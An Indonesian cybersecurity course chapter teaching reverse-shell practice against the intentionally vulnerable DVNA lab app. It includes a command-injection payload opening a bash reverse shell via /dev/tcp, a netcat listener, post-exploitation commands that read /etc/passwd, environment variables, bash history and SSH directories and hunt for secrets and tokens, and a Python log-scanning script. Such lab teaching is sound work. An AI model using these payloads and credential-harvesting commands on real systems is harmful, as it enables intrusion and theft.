# Reverse Shell

*Basic Python for Cybersecurity*

*© 2025 Yogi Agnia Dwi Saputro dan PT. Cyberkarta Tugu Teknologi.*

Dilarang keras memperbanyak, menyalin, mendistribusikan, atau menggunakan sebagian atau seluruh isi karya ini dalam bentuk apapun tanpa izin tertulis dari pemegang hak cipta.

------------------------------------

## Praktik Reverse Shell dengan Python

### Strategi Serangan dengan Reverse Shell
- Target: DVNA di localhost:9090

Strategi ketika berada dalam sistem
1. Gali informasi dasar
2. Cari potensi breakout 
3. Gali informasi lateral
4. Eskalasi privilage
5. Data exfiltration

Dalam sesi ini akan dipelajari bagian 1 & 3 sebagai aspek yang lebih relevan dalam programming.
Jika memungkinkan, akan dijalankan juga bagian 5

#### Phase 1: Ambil Informasi Dasar
Konsep dari mencari informasi dasar adalah mengetahui server, user mana yang aktif, serta cek proses yang berjalan. Informasi ini nantinya dapat berguna untuk membangun serangan berikutnya. Contoh perintah shell untuk mencari informasi dasar sebagai berikut.
- `id`: 
- `whoami`: 
- `hostname`: 
- `pwd`: 
- `uname -a`: 
- `cat /etc/os-release`: 
- `ls -al /`: 
- `cat /etc/hosts`: 
- `env`: 
- `netstat -tulpn`: 
- `ps aux`: 
- `mount`: 
- `findmnt`: 

#### Phase 3: Ambil Informasi Lateral
Dalam menjalankan peran sebagai server, biasanya akan ada "jejak" interaksi dengan sistem lain. Contohnya adalah log, database, config, env, kredensial, atau history.

### Eksekusi

#### Phase 1: Ambil Informasi Dasar
1. nyalakan DVNA Docker. 
  - Jika sudah ada docker DVNA dari chapter sebelumnya cukup cek `docker ps`. Jika ada container dengan nama "DVNA", maka aplikasi sudah berjalan.
  - Jika tidak ada container aktif, jalankan dengan `docker start dvna`
2. login DVNA --> masuk menu dengan vulnerability. Default DVNA di `http://localhost:9090/app/ping`
3. di terminal attacker, jalankan command netcat: `nc -lvp 4444 > shell.log`
4. di menu DVNA, jalankan command untuk reverse shell: `127.0.0.1;bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'`
5. di terminal attacker ekspektasi sudah terbuka shell. Paste command berikut:
```bash
  echo "[*] whoami: $(whoami)";
  echo "[*] id: $(id)";
  echo "[*] hostname: $(hostname)";
  echo "[*] pwd: $(pwd)";
  echo "[*] ls -al: $(ls -al)";
  echo "[*] uname -a: $(uname -a)";
  echo "[*] ps aux: $(ps aux)";
  echo "[*] path: $PATH | tr ':' '\n'";
  echo "[*] binaries: ls -1 /usr/bin /bin /usr/local/bin 2>/dev/null | sort | uniq";
  echo "[*] /etc/os-release:"; cat /etc/os-release;
  echo "[*] /etc/passwd:"; cat /etc/passwd;
  echo "[*] /etc/hosts:"; cat /etc/hosts;
  echo "[*] ip a || ifconfig:"; ip a || ifconfig;
  echo "[*] cat /etc/resolv.conf:"; cat /etc/resolv.conf;
  echo "[*] env: $(env)";
  echo "[*] mount: $(mount)";
  echo "[*] df -h: $(df -h)";
  echo "[*] findmnt: $(findmnt)";
  echo "[*] netstat -tulpn: $(netstat -tulpn)";
  echo "[*] find / -name '.env' 2>/dev/null: $(find / -name '.env' 2>/dev/null)";
  echo "[*] find / -name 'config*.json' 2>/dev/null: $(find / -name 'config*.json' 2>/dev/null)";
  echo "[*] find / -name '*.py' -exec grep -i 'secret' {} /dev/null \\; 2>/dev/null: $(find / -name '*.py' -exec grep -i 'secret' {} /dev/null \\; 2>/dev/null)";
  echo "[*] find / -name '*.js' -exec grep -i 'token' {} /dev/null \\; 2>/dev/null: $(find / -name '*.js' -exec grep -i 'token' {} /dev/null \\; 2>/dev/null)";
  echo "[*] ls -lah /root: $(ls -lah /root)";
  echo "[*] ls -lah /home: $(ls -lah /home)";
  echo "[*] cat ~/.bash_history || cat /root/.bash_history: $(cat ~/.bash_history || cat /root/.bash_history)";
  echo "[*] ls -lah ~/.ssh || ls -lah /root/.ssh: $(ls -lah ~/.ssh || ls -lah /root/.ssh)";
```
6. Selesai, untuk saat ini.

*Note*
- `172.17.0.1` adalah Docker bridge IP yang umum
- `4444` adalah port yang dibuka 

#### Phase 3: Ambil Informasi Lateral

Dari log yang sudah didapat, kita bisa lakukan analisis lebih dalam.
Dalam kasus ini, ada dua hal yang akan dilakukan:
1. Cari data sensitif
2. Gali informasi tech stack untuk exploit lanjutan

Masih ingat dengan program log analysis yang pernah dibuat? Kali ini kita upgrade lagi.
```python
# log_analysis_v3.py
# For educational purposes only

import sys
import argparse

def extract_sensitive_data(filepath, keywords):
    findings = {}

    try:
        with open(filepath, "r") as file:
            lines = file.readlines()
        
        for keyword in keywords:
            findings[keyword] = []

            for line in lines:
                if keyword in line:
                    findings[keyword].append(line.strip())
    except Exception as e:
        print(f"error: {str(e)}")
        sys.exit(1)
    
    return findings

def stack_frequency_analysis(filepath):
    freq_counter = {}
    stack_keywords = ["node", "cpp", "java", "python", "docker", "sql", "linux", "windows", "go"]
    try:
        with open(filepath, "r") as file:
            lines = file.readlines()
        
        for keyword in stack_keywords:
            freq_counter[keyword] = 0

            for line in lines:
                if keyword in line:
                    freq_counter[keyword] += 1
    except Exception as e:
        print(f"error: {str(e)}")
        sys.exit(1)
    
    return freq_counter

def main():
    parser = argparse.ArgumentParser(description="Log Analysis V3")
    parser.add_argument(
        "-k", "--keywords",
        required=True,
        help="Comma-separated list of keywords: api,secret,key,token"
    )
    parser.add_argument(
        "-f", "--file",
        required=True,
        help="path of file to be analyzed"
    )
    args = parser.parse_args()
    sensitive_keyword_list = [keyword.strip() for keyword in args.keywords.split(",")]

    try:
        sensitive_findings = extract_sensitive_data(args.file, sensitive_keyword_list)
        print(sensitive_findings)
        tech_stack_findings = stack_frequency_analysis(args.file)
        print(tech_stack_findings)
    except Exception as e:
        print(f"error: {str(e)}")

if __name__ == "__main__":
  main()
```

#### What's Next?
Dari informasi yang tersedia, kamu dapat mencari potensi exploit. Contoh:
- Copy file DB SQLite
- Exploit library obsolete untuk dimanfaatkan celahnya

### Kapan Python Masuk?

- Python bisa masuk untuk 2 keperluan:
  1. Menanam backdoor --> perlu instalasi Python ke dalam target
  2. Support proses serangan

- Dalam kasus DVNA, akses terhadap `apt` dan `python3` dibatasi, sehingga perlu workaround lain. 
- Agar tetap dalam koridor pemrograman, pendekatan nomor 1 tidak dilanjutkan (tentunya teman-teman pembelajar boleh eksplorasi mandiri).
- Python masuk untuk support serangan, dalam kasus ini analisis log yang lebih komprehensif.

### Catatan Tambahan
- 


## Referensi
-